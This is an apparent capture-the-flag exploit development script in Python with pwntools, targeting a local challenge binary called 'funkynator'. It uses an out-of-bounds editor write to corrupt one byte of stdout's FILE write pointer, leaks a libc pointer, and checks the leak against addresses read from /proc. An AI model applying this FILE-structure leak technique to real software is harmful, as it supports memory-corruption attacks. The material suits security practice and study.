#!/usr/bin/env python3
from pwn import *
import struct, sys, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}
r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))

r.recvuntil(b'name?', timeout=5)
r.sendline(b'TEST')
r.recvuntil(b'> ', timeout=5)

# Create msg1
r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'5')
r.recvuntil(b'message:')
r.sendline(b'AAAAA')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

# Create msg2
r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'10')
r.recvuntil(b'message:')
r.sendline(b'BBBBBBBBBB')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

log.info("Messages created, reading /proc...")

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
for l in maps.split('\n'):
    parts = l.strip().split()
    if len(parts) < 5: continue
    if 'funkynator' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        binary = int(parts[0].split('-')[0], 16)
    if 'libc.so.6' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        libc = int(parts[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0
WB_OFF = 0x20

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(libc + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

log.info(f"msg2={msg2:#x} libc={libc:#x}")
log.info(f"orig write_base = {orig_wb:#x}")

wb_byte1_addr = libc + STDOUT + WB_OFF + 1
off = (wb_byte1_addr - msg2) & 0xFFFFFFFFFFFFFFFF

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
new_wb = (orig_wb & 0xFFFFFFFFFFFF00FF) | (new_byte1 << 8)
log.info(f"byte1: {orig_byte1:#04x} -> {new_byte1:#04x}, off={off:#x}, new_wb={new_wb:#x}")

log.info("Entering editor...")
r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')
log.info("In editor")

r.sendline(b'3')
r.recvuntil(b'offset')
r.recvline()
r.sendline(str(off).encode())
r.recvuntil(b'value')
r.recvline()
log.info(f"Sending byte value {new_byte1:#04x} ('{chr(new_byte1)}')")
r.send(bytes([new_byte1]) + b'\n')

# After this, the editor loop re-prints the menu, triggering the flush
# Receive flush data + menu + '> '
log.info("Receiving flush data + editor prompt...")
data = r.recvuntil(b'> ', timeout=5)
log.info(f"Got {len(data)} bytes until '> '")

LIST_ALL = 0x1e84c0
list_all_off = (libc + LIST_ALL) - new_wb
log.info(f"Expected _IO_list_all at offset {list_all_off}")

if len(data) >= list_all_off + 8:
    leaked = struct.unpack('<Q', data[list_all_off:list_all_off+8])[0]
    log.info(f"Leaked pointer: {leaked:#x}")
    computed = leaked - 0x1e84e0
    log.info(f"Computed libc: {computed:#x}, actual: {libc:#x}")
    if computed == libc:
        log.success("PERFECT LEAK!")
    else:
        log.warning(f"diff: {computed - libc:#x}")
else:
    log.warning(f"Can't extract: have {len(data)}, need offset {list_all_off}")
    # Dump relevant areas
    start = max(0, list_all_off - 16)
    log.info(f"Data around offset {list_all_off}: {data[start:start+48].hex()}")

# Now exit editor normally
r.sendline(b'1')
resp = r.recvuntil(b'?', timeout=3)
log.info(f"Save prompt: {resp[-60:]}")
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')
log.success("Back to main menu!")

r.close()
